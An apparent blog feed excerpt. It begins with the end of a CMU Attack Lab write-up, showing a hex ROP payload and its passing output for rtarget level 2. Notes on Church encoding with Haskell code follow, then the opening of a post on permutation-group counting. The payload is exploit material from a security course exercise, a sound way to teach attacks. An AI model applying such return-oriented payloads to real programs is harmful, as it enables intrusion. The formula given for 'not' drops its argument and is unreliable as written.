<pre><code>00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 AB 19 40 00 00 00 00 00 FA 97 B9 59 00 00 00 00 A2 19 40 00 00 00 00 00 EC 17 40 00 00 00 00 00
</code></pre><p>试一试～</p>
<pre><code>$ ./hex2raw &lt; hex.txt &gt; raw &amp;&amp; ./rtarget -q -i raw
Cookie: 0x59b997fa
Touch2!: You called touch2(0x59b997fa)
Valid solution for level 2 with target rtarget
PASS: Would have posted the following:
	user id	bovik
	course	15213-f15
	lab	attacklab
	result	1:PASS:0xffffffff:rtarget:2:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 AB 19 40 00 00 00 00 00 FA 97 B9 59 00 00 00 00 A2 19 40 00 00 00 00 00 EC 17 40 00 00 00 00 00 
</code></pre><h2 id="level-3-1">Level 3+</h2>
<p><strong>等到有空的时候继续～</strong></p>
<h3 id="要求-4">要求</h3>
<p>要求与 Level 3 一样（调用 <code>touch3()</code>），但目标二进制程序变为 <code>rtarget</code>。<code>rtarget</code> 包含了上述防御措施中的前两种。</p>
<h3 id="过程-4">过程</h3>
<p><strong>咕咕咕……</strong></p>
]]></content>
		</item>
		
		<item>
			<title>Church 编码学习笔记</title>
			<link>https://codgician.me/zh-hans/posts/2020/04/church-encoding/</link>
			<pubDate>Mon, 06 Apr 2020 12:19:10 +0800</pubDate>
			
			<guid>https://codgician.me/zh-hans/posts/2020/04/church-encoding/</guid>
			<description>pre code.sourceCode { white-space: pre; position: relative; } pre code.sourceCode span { display: inline-block; line-height: 1.25; } pre code.sourceCode span:empty { height: 1.2em; } code.sourceCode span { color: inherit; text-decoration: inherit; } div.sourceCode { margin: 1em 0; } pre.sourceCode { margin: 0; } @media screen { div.sourceCode { overflow: auto; } } @media print { pre code.sourceCode { white-space: pre-wrap; } pre code.sourceCode span { text-indent: -5em; padding-left: 5em; }</description>
			<content type="html"><![CDATA[
<script src="/rmarkdown-libs/header-attrs/header-attrs.js"></script>
<style type="text/css">
pre > code.sourceCode { white-space: pre; position: relative; }
pre > code.sourceCode > span { display: inline-block; line-height: 1.25; }
pre > code.sourceCode > span:empty { height: 1.2em; }
code.sourceCode > span { color: inherit; text-decoration: inherit; }
div.sourceCode { margin: 1em 0; }
pre.sourceCode { margin: 0; }
@media screen {
div.sourceCode { overflow: auto; }
}
@media print {
pre > code.sourceCode { white-space: pre-wrap; }
pre > code.sourceCode > span { text-indent: -5em; padding-left: 5em; }
}
pre.numberSource code
  { counter-reset: source-line 0; }
pre.numberSource code > span
  { position: relative; left: -4em; counter-increment: source-line; }
pre.numberSource code > span > a:first-child::before
  { content: counter(source-line);
    position: relative; left: -1em; text-align: right; vertical-align: baseline;
    border: none; display: inline-block;
    -webkit-touch-callout: none; -webkit-user-select: none;
    -khtml-user-select: none; -moz-user-select: none;
    -ms-user-select: none; user-select: none;
    padding: 0 4px; width: 4em;
  }
pre.numberSource { margin-left: 3em;  padding-left: 4px; }
div.sourceCode
  { color: #cccccc; background-color: #303030; }
@media screen {
pre > code.sourceCode > span > a:first-child::before { text-decoration: underline; }
}
code span.al { color: #ffcfaf; } /* Alert */
code span.an { color: #7f9f7f; font-weight: bold; } /* Annotation */
code span.at { } /* Attribute */
code span.bn { color: #dca3a3; } /* BaseN */
code span.bu { } /* BuiltIn */
code span.cf { color: #f0dfaf; } /* ControlFlow */
code span.ch { color: #dca3a3; } /* Char */
code span.cn { color: #dca3a3; font-weight: bold; } /* Constant */
code span.co { color: #7f9f7f; } /* Comment */
code span.cv { color: #7f9f7f; font-weight: bold; } /* CommentVar */
code span.do { color: #7f9f7f; } /* Documentation */
code span.dt { color: #dfdfbf; } /* DataType */
code span.dv { color: #dcdccc; } /* DecVal */
code span.er { color: #c3bf9f; } /* Error */
code span.ex { } /* Extension */
code span.fl { color: #c0bed1; } /* Float */
code span.fu { color: #efef8f; } /* Function */
code span.im { } /* Import */
code span.in { color: #7f9f7f; font-weight: bold; } /* Information */
code span.kw { color: #f0dfaf; } /* Keyword */
code span.op { color: #f0efd0; } /* Operator */
code span.ot { color: #efef8f; } /* Other */
code span.pp { color: #ffcfaf; font-weight: bold; } /* Preprocessor */
code span.sc { color: #dca3a3; } /* SpecialChar */
code span.ss { color: #cc9393; } /* SpecialString */
code span.st { color: #cc9393; } /* String */
code span.va { } /* Variable */
code span.vs { color: #cc9393; } /* VerbatimString */
code span.wa { color: #7f9f7f; font-weight: bold; } /* Warning */
</style>

<div id="TOC">
<ul>
<li><a href="#简介">简介</a></li>
<li><a href="#church-booleans">Church Booleans</a>
<ul>
<li><a href="#定义">定义</a></li>
<li><a href="#运算">运算</a>
<ul>
<li><a href="#非运算">非运算</a></li>
<li><a href="#与运算">与运算</a></li>
<li><a href="#或运算">或运算</a></li>
<li><a href="#其他">其他？</a></li>
</ul></li>
<li><a href="#实现">实现</a></li>
</ul></li>
<li><a href="#church-maybe">Church Maybe</a></li>
<li><a href="#church-numerals">Church Numerals</a>
<ul>
<li><a href="#peano-axioms">Peano Axioms</a></li>
<li><a href="#定义-1">定义</a></li>
<li><a href="#基础运算">基础运算</a>
<ul>
<li><a href="#后继元素">后继元素</a></li>
<li><a href="#加法">加法</a></li>
<li><a href="#乘法">乘法</a></li>
<li><a href="#幂运算">幂运算</a></li>
</ul></li>
<li><a href="#实现-1">实现</a></li>
<li><a href="#减法">减法？</a></li>
</ul></li>
<li><a href="#refs">Refs</a></li>
</ul>
</div>

<div id="简介" class="section level1">
<h1>简介</h1>
<p>既然 <span class="math inline">\(\lambda\)</span> 演算与图灵机等价，那么理论上图灵机能干的事情都能通过 <span class="math inline">\(\lambda\)</span> 演算表示。</p>
<p>考虑一个不支持任何除了 <span class="math inline">\(\lambda\)</span> 表达式的编程语言…… 假设我们要在其中建立一个支持计数，并且支持各种运算的表示系统，该如何只用 <span class="math inline">\(\lambda\)</span> 表达式来构造它？更进一步，是否可以仅用 <span class="math inline">\(\lambda\)</span> 表达式来构造诸如链表的数据结构？</p>
<p>Church 编码便能解决这一问题，其可以定义与布尔数等价的 Church Boolean，借助皮亚诺公理 (Peano Axioms) 能够定义出与自然数等价的 Church Numeral，甚至还可以定义出 Church Pairs 和 Church List…… 本文作为自己在学习 Church 编码所记录的笔记，可能有很多不合适的地方，等到以后自己有更加深入的理解后再来修改吧……</p>
<p>本文会随自己学习精度慢慢（<del>咕咕</del>）更新……</p>
</div>
<div id="church-booleans" class="section level1">
<h1>Church Booleans</h1>
<div id="定义" class="section level2">
<h2>定义</h2>
<p>首先来考虑构造真和假。既然有两样东西，考虑选择二元函数：对于真所代表的函数，它总是返回第一个参数；而对于否所代表的函数，它总是返回第二个参数。于是：</p>
<p><span class="math display">\[
\begin{aligned}
true &amp; = \lambda x \ . \ \lambda y \ . \ x \\
false &amp; = \lambda x \ . \ \lambda y \ . \ y
\end{aligned}
\]</span></p>
<p>发现这样构造带来一个非常有趣的性质：Church Boolean 似乎内置了 <span class="math inline">\(\text{if - then - else}\)</span> 这种表达形式。考虑如下 <span class="math inline">\(\lambda\)</span> 表达式：</p>
<p><span class="math display">\[
b \enspace T \enspace F
\]</span></p>
<p>其中 <span class="math inline">\(b\)</span> 是一个 Church Boolean。发现其实际含义就是，若 <span class="math inline">\(b\)</span> 为真，则结果为 <span class="math inline">\(T\)</span>，否则结果为 <span class="math inline">\(F\)</span>，跟 <span class="math inline">\(\text{if } \ b \ \text{ then } \ T \ \text{ else } \ F\)</span> 实际上没有什么区别。所以实际上可以定义自己的条件分支表达式：</p>
<p><span class="math display">\[
iff = \lambda b \ . \ \lambda t \ . \ \lambda f \ . \ b \enspace t \enspace f 
\]</span></p>
</div>
<div id="运算" class="section level2">
<h2>运算</h2>
<p>可以应用上面提到的性质比较轻松地定义出所有的布尔逻辑运算……</p>
<div id="非运算" class="section level3">
<h3>非运算</h3>
<p>先来看最简单的非运算。非运算是一个单参数的函数，对于 Church Boolean <span class="math inline">\(b\)</span> 可以表示成 <span class="math inline">\(\text{ if } \ b \ \text{ then } \ true \ \text{else} \ false\)</span>，因此可以写作：</p>
<p><span class="math display">\[
not = \lambda b \ . \ false \enspace true
\]</span></p>
</div>
<div id="与运算" class="section level3">
<h3>与运算</h3>
<p>与运算则是一个双参数的函数，当且仅当两参数 <span class="math inline">\(a, b\)</span> 都为 <span class="math inline">\(true\)</span> 是才会返回 <span class="math inline">\(true\)</span>，否则返回 <span class="math inline">\(false\)</span>。可以表示成 <span class="math inline">\(\text{ if } \ a \ \text{ then } ( \ \text{ if } \ b \ \text{ then } \ true \ \text{ else } \ false \ ) \ \text { else } \ false\)</span>，因此：</p>
<p><span class="math display">\[
and = \lambda a \ . \ \lambda b \ . \ a \enspace (b \enspace true \enspace false) \enspace false
\]</span></p>
</div>
<div id="或运算" class="section level3">
<h3>或运算</h3>
<p>或运算也是一个双参数的函数，只要两参数 <span class="math inline">\(a, b\)</span> 中存在一个 <span class="math inline">\(true\)</span> 即返回 <span class="math inline">\(true\)</span>，否则返回 <span class="math inline">\(false\)</span>。可以表示成 <span class="math inline">\(\text{ if } \ a \ \text{ then } \ true \ \text{else} \ ( \ \text{ if } \ b \ \text{ then } \ true \ \text{ else } \ false \ )\)</span>，因此：</p>
<p><span class="math display">\[
or = \lambda a \ . \ \lambda b \ . \ a \enspace true \enspace (b \enspace true \enspace false)
\]</span></p>
</div>
<div id="其他" class="section level3">
<h3>其他？</h3>
<p>诸如异或、同或等运算已经可以由上述三种运算组合起来表示了。</p>
</div>
</div>
<div id="实现" class="section level2">
<h2>实现</h2>
<p>用 Haskell 实现（ <a href="https://www.codewars.com/kata/5ac739ed3fdf73d3f0000048">CodeWars: Church Booleans</a>）：</p>
<div class="sourceCode" id="cb1"><pre class="sourceCode haskell"><code class="sourceCode haskell"><span id="cb1-1"><a href="#cb1-1"></a><span class="ot">{-# Language RankNTypes #-}</span></span>
<span id="cb1-2"><a href="#cb1-2"></a></span>
<span id="cb1-3"><a href="#cb1-3"></a><span class="kw">import</span> <span class="dt">Prelude</span> <span class="kw">hiding</span> (<span class="dt">Bool</span>, <span class="dt">False</span>, <span class="dt">True</span>, not, and, or, (&amp;&amp;), (||), (==), (/=))</span>
<span id="cb1-4"><a href="#cb1-4"></a></span>
<span id="cb1-5"><a href="#cb1-5"></a><span class="kw">type</span> <span class="dt">Boolean</span> <span class="ot">=</span> <span class="kw">forall</span> a<span class="op">.</span> a <span class="ot">-&gt;</span> a <span class="ot">-&gt;</span> a </span>
<span id="cb1-6"><a href="#cb1-6"></a></span>
<span id="cb1-7"><a href="#cb1-7"></a>false,<span class="ot"> true ::</span> <span class="dt">Boolean</span></span>
<span id="cb1-8"><a href="#cb1-8"></a>false <span class="ot">=</span> \ t f <span class="ot">-&gt;</span> f</span>
<span id="cb1-9"><a href="#cb1-9"></a>true  <span class="ot">=</span> \ t f <span class="ot">-&gt;</span> t</span>
<span id="cb1-10"><a href="#cb1-10"></a></span>
<span id="cb1-11"><a href="#cb1-11"></a><span class="fu">not</span><span class="ot"> ::</span> <span class="dt">Boolean</span> <span class="ot">-&gt;</span> <span class="dt">Boolean</span></span>
<span id="cb1-12"><a href="#cb1-12"></a><span class="fu">and</span>, <span class="fu">or</span>,<span class="ot"> xor ::</span> <span class="dt">Boolean</span> <span class="ot">-&gt;</span> <span class="dt">Boolean</span> <span class="ot">-&gt;</span> <span class="dt">Boolean</span></span>
<span id="cb1-13"><a href="#cb1-13"></a></span>
<span id="cb1-14"><a href="#cb1-14"></a><span class="fu">not</span> <span class="ot">=</span> \ a   <span class="ot">-&gt;</span> a false true</span>
<span id="cb1-15"><a href="#cb1-15"></a><span class="fu">and</span> <span class="ot">=</span> \ a b <span class="ot">-&gt;</span> a (b true false) false</span>
<span id="cb1-16"><a href="#cb1-16"></a><span class="fu">or</span>  <span class="ot">=</span> \ a b <span class="ot">-&gt;</span> a true (b true false)</span></code></pre></div>
</div>
</div>
<div id="church-maybe" class="section level1">
<h1>Church Maybe</h1>
</div>
<div id="church-numerals" class="section level1">
<h1>Church Numerals</h1>
<div id="peano-axioms" class="section level2">
<h2>Peano Axioms</h2>
<p>在讨论 Church 数前，先来看看自然数是怎么被定义的。显然可以递归地定义自然数（类似于数学归纳法），首先定义 <span class="math inline">\(0\)</span>，其次对于任意自然数 <span class="math inline">\(n\)</span> 定义一个能获得其后继元素的函数 <span class="math inline">\(S(n)\)</span>（对于自然数而言，显然 <span class="math inline">\(S(n) = n + 1\)</span>）就行了。严谨地说，定义自然数集 <span class="math inline">\(\mathbb{N}\)</span> 的过程如下：</p>
<ul>
<li><span class="math inline">\(0 \in \mathbb{N}\)</span></li>
<li>定义等价关系 (equality relation)：
<ul>
<li><strong>自反性</strong>：<span class="math inline">\(\forall x \in \mathbb{N},\ x = x\)</span></li>
<li><strong>对称性</strong>：<span class="math inline">\(\forall x, y \in \mathbb{N},\ x = y \Rightarrow y = x\)</span></li>
<li><strong>传递性</strong>：<span class="math inline">\(\forall x, y, z \in \mathbb{N},\ x = y,\ y = z \Rightarrow x = z\)</span></li>
<li><strong>封闭性</strong>：<span class="math inline">\(\forall x \in \mathbb{N},\ x = y \Rightarrow y \in \mathbb{N}\)</span></li>
</ul></li>
<li>定义算术性质 (arithmetical properties)：
<ul>
<li><span class="math inline">\(\forall n \in \mathbb{N},\ S(n) \in \mathbb{N}\)</span></li>
<li><span class="math inline">\(\forall m, n \in \mathbb{N},\ m = n \Leftrightarrow S(m) = S(n)\)</span></li>
<li><span class="math inline">\(\forall n \in \mathbb{N},\ S(n) \neq 0\)</span></li>
</ul></li>
<li>归纳公理 (induction axiom)：
<ul>
<li>若 <span class="math inline">\(\mathbb{K}\)</span> 是一个集合，满足：
<ul>
<li><span class="math inline">\(0 \in \mathbb{K}\)</span></li>
<li><span class="math inline">\(\forall n \in \mathbb{K},\ S(n) \in \mathbb{K}\)</span></li>
</ul></li>
<li>则：<span class="math inline">\(\mathbb{N} \subseteq \mathbb{K}\)</span></li>
</ul></li>
</ul>
</div>
<div id="定义-1" class="section level2">
<h2>定义</h2>
<p>既然只要有了后继函数和 <span class="math inline">\(0\)</span> 就可以表示出所有的自然数，那么依然考虑用二元函数来表述 Church 数，形如：</p>
<p><span class="math display">\[
\lambda f \ . \ \lambda x \ . \ something
\]</span></p>
<p>其中第一个参数 <span class="math inline">\(f\)</span> 可以看作后继函数，第二个参数 <span class="math inline">\(x\)</span> 可看作 <span class="math inline">\(0\)</span> 。由此可以很方便地使用这个式子定义 <span class="math inline">\(0\)</span> ：</p>
<p><span class="math display">\[
C_0 = \lambda f \ . \ \lambda x \ . \ x
\]</span></p>
<p>可以看到，不论我们传递给它什么后继函数，它所返回的结果都是 <span class="math inline">\(0\)</span> 。进一步，也可以比较轻松地定义：</p>
<p><span class="math display">\[
\begin{aligned}
C_1 &amp; = \lambda f \ . \ \lambda x \ . \ f \enspace x \\
C_2 &amp; = \lambda f \ . \ \lambda x \ . \ f \enspace (f \enspace x) \\
C_3 &amp; = \lambda f \ . \ \lambda x \ . \ f \enspace (f \enspace (f \enspace x)) \\
&amp; \dots
\end{aligned}
\]</span></p>
<p>可见，我们可以通过 Church Numeral 得到与自然数等价的任何事物。例如对于自然数 <span class="math inline">\(n\)</span>，有：</p>
<p><span class="math display">\[
n = C_n \enspace (+1) \enspace 0
\]</span></p>
</div>
<div id="基础运算" class="section level2">
<h2>基础运算</h2>
<div id="后继元素" class="section level3">
<h3>后继元素</h3>
<p>在尝试解决加法前我们先解决一个看起来简单一些的问题：以 <span class="math inline">\(C_n\)</span> 为参数，而以 <span class="math inline">\(C_{n + 1}\)</span> 为返回值的函数 <span class="math inline">\(succ\)</span> 应当如何定义？</p>
<p>如果我们能够定义出 <span class="math inline">\(succ\)</span>，那么将 <span class="math inline">\(succ\)</span> 作用 <span class="math inline">\(b\)</span> 次于 <span class="math inline">\(C_a\)</span> 即可达到 <span class="math inline">\(C_a + C_b\)</span> 的效果，更进一步，如果定义出了加法，则将 <span class="math inline">\((+ C_a)\)</span> 作用 <span class="math inline">\(b\)</span> 次于 <span class="math inline">\(0\)</span> 即可达到 <span class="math inline">\(C_a \cdot C_b\)</span> 的效果。</p>
<p>为了方便理解，先继续以自然数 <span class="math inline">\(n\)</span> 作为例子：</p>
<p><span class="math display">\[
\begin{aligned}
n + 1 
&amp; = C_{n + 1} \enspace (+1) \enspace 0 \\ 
&amp; = C_n \enspace (+1) \enspace 1 \\
&amp; = C_n \enspace (+1) \enspace (C_1 \enspace (+1) \enspace 0) \\
\end{aligned}
\]</span></p>
<p>这启示我们，当 <span class="math inline">\(succ\)</span> 作用于 <span class="math inline">\(C_n\)</span> 时，只需要保持后继函数 <span class="math inline">\(f\)</span> 不变，同时将零元由 <span class="math inline">\(x\)</span> 变为 <span class="math inline">\(f \enspace x\)</span> 就可以了。因此：</p>
<p><span class="math display">\[
succ = \lambda M \ . \ \lambda f \ . \ \lambda x \ . \ f \enspace (M \enspace f \enspace x)
\]</span></p>
<p>举个例子，试试用它作用于 <span class="math inline">\(C_0\)</span>：</p>
<p><span class="math display">\[
\begin{aligned}
succ \enspace C_0 
&amp; = (\lambda M \ . \ \lambda f \ . \ \lambda x \ . \ f \enspace (M \enspace f \enspace x)) \enspace \lambda f \ . \ \lambda x \ . \ x \\
&amp; = (\lambda f \ . \ \lambda x \ . \ f \enspace (M \enspace f \enspace x)) \enspace [M := \lambda f \ . \ \lambda x \ . \ x] \\
&amp; = (\lambda g \ . \ \lambda y \ . \ g \enspace (M \enspace g \enspace y)) \enspace [M := \lambda f \ . \ \lambda x \ . \ x] \\
&amp; = (\lambda g \ . \ \lambda y \ . \ g \enspace ((\lambda f \ . \ \lambda x \ . \ x) \enspace g \enspace y)) \\
&amp; = \lambda g \ . \ \lambda y \ . \ g \enspace y \\
&amp; = \lambda f \ . \ \lambda x \ . \ f \enspace x \\
&amp; = C_1
\end{aligned}
\]</span></p>
</div>
<div id="加法" class="section level3">
<h3>加法</h3>
<p>前面成功定义出了 <span class="math inline">\(succ\)</span>，但还留下了一个问题：怎么表示 <span class="math inline">\(\underbrace{succ \circ succ \circ \dots \circ succ}_{b \text{ times}}\)</span>（下面简写为 <span class="math inline">\(succ^b\)</span>）？</p>
<p><span class="math display">\[
\begin{aligned}
succ^b
&amp; = [ \lambda M \ . \ \lambda f \ . \ \lambda x \ . \ f \enspace (M \enspace f \enspace x) ]^b \\
&amp; = \lambda x \ . \ f^b  \enspace x \enspace [ f := \lambda M \ . \ \lambda f \ . \ \lambda x \ . \ f \enspace (M \enspace f \enspace x) ] \\
&amp; = (\lambda f \ . \ \lambda x \ . \ f^b \enspace x) \enspace \lambda M \ . \ \lambda f \ . \ \lambda x \ . \ f \enspace (M \enspace f \enspace x) \\
&amp; = C_b \enspace succ
\end{aligned}
\]</span></p>
<p>简要推广，对于任意一元 Church Numeral 函数 <span class="math inline">\(f\)</span>，都有：</p>
<p><span class="math display">\[
f^b = C_b \enspace f
\]</span></p>
<p>于是对于加法：</p>
<p><span class="math display">\[
\begin{aligned}
C_a + C_b
&amp; = (+ C_b) \enspace C_a \\
&amp; = (C_b \enspace succ) \enspace C_a 
\end{aligned} 
\]</span></p>
<hr />
<p>我们也可以不考虑 <span class="math inline">\(succ\)</span>，换一个角度考虑加法：其可看作二元函数，输入 <span class="math inline">\(C_a, C_b\)</span> 并且返回 <span class="math inline">\(C_{a + b}\)</span>。依然以自然数 <span class="math inline">\(a, b\)</span> 举例：</p>
<p><span class="math display">\[
\begin{aligned}
a + b
&amp; = C_{a + b} \enspace (+1) \enspace 0 \\
&amp; = C_a \enspace (+1) \enspace b \\
&amp; = C_a \enspace (+1) \enspace (C_b \enspace (+1) \enspace 0)
\end{aligned}
\]</span></p>
<p>故将 <span class="math inline">\(C_a\)</span> 作用于后继函数 <span class="math inline">\(f\)</span>，同时将 <span class="math inline">\(C_b\)</span> 作用于零元 <span class="math inline">\(x\)</span> 即可得到 <span class="math inline">\(C_{a + b}\)</span>：</p>
<p><span class="math display">\[
(+) = \lambda M \ . \ \lambda N \ . \ \lambda f \ . \ \lambda x \ . \ M \enspace f \enspace (N \enspace f \enspace x)
\]</span></p>
</div>
<div id="乘法" class="section level3">
<h3>乘法</h3>
<p>与之前类似地，可以借助加法表示乘法，将 <span class="math inline">\((+ C_a)\)</span> 作用 <span class="math inline">\(b\)</span> 次于 <span class="math inline">\(C_0\)</span> 即可：</p>
<p><span class="math display">\[
C_a \cdot C_b = C_b \enspace  (+ C_a) \enspace C_0
\]</span></p>
<hr />
<p>若不借助加法，可考虑：乘法运算以 <span class="math inline">\(C_a, C_b\)</span> 为参数，并返回 <span class="math inline">\(C_{a \cdot b}\)</span>。依然以自然数 <span class="math inline">\(a, b\)</span> 举例：</p>
<p><span class="math display">\[
\begin{aligned}
a \cdot b 
&amp; = C_{a \cdot b} \enspace (+1) \enspace 0 \\
&amp; = C_a \enspace (+b) \enspace 0 \\
&amp; = C_a \enspace (C_b \enspace (+1)) \enspace 0
\end{aligned}
\]</span></p>
<p>这启示我们，只需要将 <span class="math inline">\(C_a, C_b\)</span> 依次作用于后继函数 <span class="math inline">\(f\)</span>，并且保持零元 <span class="math inline">\(x\)</span> 不变即可：</p>
<p><span class="math display">\[
(\cdot) = \lambda M \ . \ \lambda N \ . \ \lambda f \ . \ \lambda x \ . \ M \enspace (N \enspace f) \enspace x 
\]</span></p>
</div>
<div id="幂运算" class="section level3">
<h3>幂运算</h3>
<p>与自然数的情况类似，幂运算还是得借助乘法实现，将 <span class="math inline">\((\cdot C_a)\)</span> 作用 <span class="math inline">\(b\)</span> 次于 <span class="math inline">\(C_1\)</span> 即可：</p>
<p><span class="math display">\[
C_a \hat{\enspace} C_b = C_b \enspace (\cdot C_a) \enspace C_1
\]</span></p>
</div>
</div>
<div id="实现-1" class="section level2">
<h2>实现</h2>
<p>用 Haskell 实现（ <a href="https://www.codewars.com/kata/546dbd81018e956b51000077">CodeWars: Church Numbers</a>）：</p>
<div class="sourceCode" id="cb2"><pre class="sourceCode haskell"><code class="sourceCode haskell"><span id="cb2-1"><a href="#cb2-1"></a><span class="ot">{-# LANGUAGE RankNTypes #-}</span></span>
<span id="cb2-2"><a href="#cb2-2"></a></span>
<span id="cb2-3"><a href="#cb2-3"></a><span class="kw">import</span> <span class="dt">Prelude</span> <span class="kw">hiding</span> (succ)</span>
<span id="cb2-4"><a href="#cb2-4"></a></span>
<span id="cb2-5"><a href="#cb2-5"></a><span class="kw">newtype</span> <span class="dt">Number</span> <span class="ot">=</span> <span class="dt">Nr</span> (<span class="kw">forall</span> a<span class="op">.</span> (a <span class="ot">-&gt;</span> a) <span class="ot">-&gt;</span> a <span class="ot">-&gt;</span> a)</span>
<span id="cb2-6"><a href="#cb2-6"></a></span>
<span id="cb2-7"><a href="#cb2-7"></a><span class="ot">zero ::</span> <span class="dt">Number</span></span>
<span id="cb2-8"><a href="#cb2-8"></a>zero <span class="ot">=</span> <span class="dt">Nr</span> (\ _ x <span class="ot">-&gt;</span> x)</span>
<span id="cb2-9"><a href="#cb2-9"></a></span>
<span id="cb2-10"><a href="#cb2-10"></a><span class="fu">succ</span><span class="ot"> ::</span> <span class="dt">Number</span> <span class="ot">-&gt;</span> <span class="dt">Number</span></span>
<span id="cb2-11"><a href="#cb2-11"></a><span class="fu">succ</span> (<span class="dt">Nr</span> a) <span class="ot">=</span> <span class="dt">Nr</span> (\ f x <span class="ot">-&gt;</span> f (a f x))</span>
<span id="cb2-12"><a href="#cb2-12"></a></span>
<span id="cb2-13"><a href="#cb2-13"></a><span class="ot">one ::</span> <span class="dt">Number</span></span>
<span id="cb2-14"><a href="#cb2-14"></a>one <span class="ot">=</span> <span class="fu">succ</span> zero</span>
<span id="cb2-15"><a href="#cb2-15"></a></span>
<span id="cb2-16"><a href="#cb2-16"></a><span class="ot">add ::</span> <span class="dt">Number</span> <span class="ot">-&gt;</span> <span class="dt">Number</span> <span class="ot">-&gt;</span> <span class="dt">Number</span></span>
<span id="cb2-17"><a href="#cb2-17"></a>add (<span class="dt">Nr</span> a) <span class="ot">=</span> a <span class="fu">succ</span></span>
<span id="cb2-18"><a href="#cb2-18"></a><span class="co">-- add (Nr a) (Nr b) = Nr (\ f x -&gt; a f (b f x))</span></span>
<span id="cb2-19"><a href="#cb2-19"></a></span>
<span id="cb2-20"><a href="#cb2-20"></a><span class="ot">mult ::</span> <span class="dt">Number</span> <span class="ot">-&gt;</span> <span class="dt">Number</span> <span class="ot">-&gt;</span> <span class="dt">Number</span></span>
<span id="cb2-21"><a href="#cb2-21"></a>mult (<span class="dt">Nr</span> a) b <span class="ot">=</span>  a (add b) zero</span>
<span id="cb2-22"><a href="#cb2-22"></a><span class="co">-- mult (Nr a) (Nr b) = Nr (\ f x -&gt; a (b f) x)</span></span>
<span id="cb2-23"><a href="#cb2-23"></a></span>
<span id="cb2-24"><a href="#cb2-24"></a><span class="ot">pow ::</span> <span class="dt">Number</span> <span class="ot">-&gt;</span> <span class="dt">Number</span> <span class="ot">-&gt;</span> <span class="dt">Number</span></span>
<span id="cb2-25"><a href="#cb2-25"></a>pow x (<span class="dt">Nr</span> n) <span class="ot">=</span> n (mult x) one</span></code></pre></div>
</div>
<div id="减法" class="section level2">
<h2>减法？</h2>
<p>对于 Church Numeral 的减法是一个非常有趣且不简单的问题。先考虑较简单的情况：对于以 <span class="math inline">\(C_n\)</span> 为参数，<span class="math inline">\(C_{n - 1}\)</span> 为结果的函数 <span class="math inline">\(pred\)</span> 应当如何定义（即求前驱元素）。</p>
<p>很快发现一个问题：<span class="math inline">\(pred \enspace C_0 = ?\)</span> 为了保证 <span class="math inline">\(pred\)</span> 是 well-defined 的，则：</p>
<p><span class="math display">\[
pred \enspace C_n = 
\begin{cases}
C_0 &amp; n = 0 \\
C_{n - 1} &amp; \text{otherwise}
\end{cases}
\]</span></p>
</div>
</div>
<div id="refs" class="section level1">
<h1>Refs</h1>
<ul>
<li><a href="https://www.cs.rice.edu/~javaplt/311/Readings/supplemental.pdf">Comp 311 - Review 2</a></li>
<li><a href="https://blog.ploeh.dk/2018/05/22/church-encoding/">Church Encoding by Mark Seemann</a></li>
<li><a href="https://en.wikipedia.org/wiki/Peano_axioms">Peano Aximos - Wikipedia</a></li>
</ul>
</div>
]]></content>
		</item>
		
		<item>
			<title>浅谈置换群计数</title>
			<link>https://codgician.me/zh-hans/posts/2020/03/permutation-group/</link>
			<pubDate>Thu, 26 Mar 2020 18:28:27 +0800</pubDate>
			
			<guid>https://codgician.me/zh-hans/posts/2020/03/permutation-group/</guid>
			<description>前言 群论基础 集合论基础 关系 等价关系 等价类 群论基础 群 子群 陪集 拉格朗日定理 置换、置换群 置换 轮换表示法 置换的幂运算 置换群 群在集合上的作用 轨道 稳定子</description>
			<content type="html"><![CDATA[
<script src="/rmarkdown-libs/header-attrs/header-attrs.js"></script>

<div id="TOC">
<ul>
<li><a href="#前言">前言</a></li>
<li><a href="#群论基础">群论基础</a>
<ul>
<li><a href="#集合论基础">集合论基础</a>
<ul>
<li><a href="#关系">关系</a></li>
<li><a href="#等价关系">等价关系</a></li>
<li><a href="#等价类">等价类</a></li>
</ul></li>
<li><a href="#群论基础-1">群论基础</a>
<ul>
<li><a href="#群">群</a></li>
<li><a href="#子群">子群</a></li>
<li><a href="#陪集">陪集</a></li>
<li><a href="#拉格朗日定理">拉格朗日定理</a></li>
</ul></li>
<li><a href="#置换置换群">置换、置换群</a>
<ul>
<li><a href="#置换">置换</a></li>
<li><a href="#轮换表示法">轮换表示法</a></li>
<li><a href="#置换的幂运算">置换的幂运算</a></li>
<li><a href="#置换群">置换群</a></li>
</ul></li>
<li><a href="#群在集合上的作用">群在集合上的作用</a>
<ul>
<li><a href="#轨道">轨道</a></li>
<li><a href="#稳定子">稳定子</a></li>
<li><a href="#轨道-稳定子定理">轨道-稳定子定理</a></li>
</ul></li>
</ul></li>
<li><a href="#burnside-引理">Burnside 引理</a>
<ul>
<li><a href="#内容">内容</a></li>
<li><a href="#证明">证明</a></li>
</ul></li>
<li><a href="#pólya-计数法">Pólya 计数法</a></li>
<li><a href="#常见题型">常见题型</a></li>
</ul>
</div>

<div id="前言" class="section level1">
<h1>前言</h1>
<p>我们先引入一些例子来介绍一下 Burnside 引理常见的应用。</p>
<p>考虑一个等边三角形玩具，要对其顶点用红蓝两种颜色进行染色。由乘法原理，如果不考虑其他条件染色方案数量为 <span class="math inline">\(2^3 = 8\)</span> 种。但是，<code>红 - 蓝 - 红</code> 和 <code>红 - 红 - 蓝</code> 本质上对应的是同一种方案，后者可以由前者通过旋转得到。故本质上不同的染色方案一定小于 <span class="math inline">\(8\)</span> 种（事实上只有 <span class="math inline">\(4\)</span> 种）。应对这一类问题，仅靠传统的组合数学是非常难以应对的，而如果引入群论、置换群、置换群在集合上的作用等概念，再结合 Burnside 引理的话，就可以较好地解决这一类”求本质不同染色方案数“的问题。</p>
<p>另外，Burnside 引理也常被应用于化学上同分异构体种类的计数，大家感兴趣的话也可以了解一下~</p>
<p>本文大致分为三个部分：第一部分会首先对证明 Burnside 引理所需要的基本抽象代数知识进行介绍；第二部分会引入文章的主题 —— Burnside 引理和基础的 Pólya 计数法；最后会浅谈一下 Burnside 引理在算法竞赛中的几类常见题型。同时，本文某种程度上也可以作为之前在集训队内做过的讲座 <a href="https://codgician.me/pgslides">浅谈置换群</a> 的讲义。</p>
<p>另外，我的水平也有限，所以本文中的部分用语可能不太严谨…… 欢迎大家提出指正 QwQ。</p>
</div>
<div id="群论基础" class="section level1">
<h1>群论基础</h1>
<div id="集合论基础" class="section level2">
